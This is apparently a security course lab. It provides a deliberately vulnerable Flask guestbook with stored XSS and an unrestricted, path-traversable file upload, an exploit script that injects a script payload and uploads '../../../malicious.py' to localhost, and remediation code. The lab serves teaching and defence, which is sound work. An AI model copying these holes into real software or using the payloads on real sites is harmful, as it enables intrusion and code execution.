# 06 - Hands-on Lab: Web Vulnerabilities

This lab provides a self-contained Python Flask application containing Stored XSS and Unrestricted File Upload vulnerabilities, an exploit script, and a secure remediation guide.

## 1. Vulnerable Flask Application (`app.py`)
```python
import os
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Vulnerability 1: Stored XSS Database
comments = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<body>
    <h1>Guestbook & File Upload</h1>
    
    <h2>Comments</h2>
    <ul>
    {% for comment in comments %}
        <!-- VULNERABLE: Using safe filter prevents escaping -->
        <li>{{ comment | safe }}</li>
    {% endfor %}
    </ul>
    
    <form action="/comment" method="POST">
        <input type="text" name="comment" placeholder="Leave a comment">
        <button type="submit">Submit</button>
    </form>

    <h2>Upload File</h2>
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, comments=comments)

@app.route('/comment', methods=['POST'])
def add_comment():
    # VULNERABLE: Storing unsanitized input
    comment = request.form.get('comment', '')
    comments.append(comment)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    # VULNERABLE: Unrestricted File Upload
    file = request.files.get('file')
    if file:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(filepath)
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(port=5000)
```

## 2. Exploit Script (`exploit.py`)
```python
import requests

TARGET = "http://localhost:5000"

def exploit_xss():
    print("[*] Exploiting Stored XSS...")
    payload = "<script>alert('XSS Exploit Successful!')</script>"
    requests.post(f"{TARGET}/comment", data={"comment": payload})
    print("[+] XSS Payload Injected.")

def exploit_upload():
    print("[*] Exploiting File Upload (Path Traversal)...")
    # Using path traversal in filename
    files = {'file': ('../../../malicious.py', 'print("RCE")')}
    requests.post(f"{TARGET}/upload", files=files)
    print("[+] Malicious file uploaded with Path Traversal.")

if __name__ == "__main__":
    exploit_xss()
    exploit_upload()
```

## 3. Secure Remediation
Apply the following fixes to `app.py`:

1. **Fix Stored XSS:** Remove the `| safe` filter in the template so Jinja2 auto-escapes the HTML.
```html
<li>{{ comment }}</li>
```

2. **Fix File Upload:** Validate extensions and sanitize filenames.
```python
from werkzeug.utils import secure_filename
import uuid

ALLOWED_EXTENSIONS = {'txt', 'png', 'jpg'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file and allowed_file(file.filename):
        # SECURE: Sanitize filename and use random UUID
        ext = file.filename.rsplit('.', 1)[1].lower()
        filename = secure_filename(file.filename) # Strips directory traversal
        safe_name = f"{uuid.uuid4().hex}.{ext}"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_name)
        file.save(filepath)
    return redirect(url_for('index'))
```
